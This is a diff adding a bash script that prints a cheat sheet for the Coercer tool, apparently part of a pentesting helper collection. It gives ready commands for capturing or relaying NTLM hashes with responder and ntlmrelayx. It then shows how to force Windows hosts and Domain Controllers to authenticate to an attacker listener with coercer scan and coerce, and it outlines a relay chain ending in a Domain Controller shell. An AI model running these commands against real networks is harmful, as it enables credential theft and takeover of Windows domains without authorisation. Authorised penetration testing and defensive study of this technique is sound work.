@@ -1,0 +1,30 @@
+#!/bin/bash
+echo -e "\033[32m╔══════════════════════════════════════╗"
+echo -e "║  📢 Coercer — Auth Coercion Attacks ║"
+echo -e "╚══════════════════════════════════════╝\033[0m"
+echo
+echo -e "\033[33mWhy use it:\033[0m Forces Windows machines to authenticate to YOUR"
+echo "  server — capturing their NTLM hashes for cracking or relay. Exploits"
+echo "  RPC methods like PetitPotam, PrinterBug, MS-EFSRPC to trigger"
+echo "  authentication from any Windows host (including Domain Controllers)."
+echo "  Combined with ntlmrelayx, this = instant DC compromise. One of the"
+echo "  most powerful attack primitives in modern Windows pentesting."
+echo
+echo -e "\033[33m1. Start a listener (capture hashes):\033[0m"
+echo "  # On attacker:  sudo responder -I eth0   OR   ntlmrelayx -t smb://10.0.0.20"
+echo
+echo -e "\033[33m2. Coerce a target to authenticate to you:\033[0m"
+echo "  coercer scan -u user -p 'Pass123' -t 10.0.0.20 --filter-port 445"
+echo "  coercer coerce -u user -p 'Pass123' -t 10.0.0.20 -l 192.168.50.10"
+echo
+echo -e "\033[33m3. Coerce a Domain Controller ( PetitPotam style):\033[0m"
+echo "  coercer coerce -u user -p 'Pass123' -t 10.0.0.1 -l 192.168.50.10"
+echo "  # DC sends its hash to your listener → relay to LDAP → AD CS → DC shell"
+echo
+echo -e "\033[33mModes:\033[0m"
+echo "  scan     # Check which methods work (non-intrusive)"
+echo "  coerce   # Actually trigger authentication (intrusive!)"
+echo "  fuzz      # Find new coercion methods"
+echo
+echo -e "\033[33mKey flags:\033[0m  -t target · -l listener-IP · -u user · -p pass · --filter-port 445"
+echo -e "\033[90m──────────────────────────────────────\033[0m"
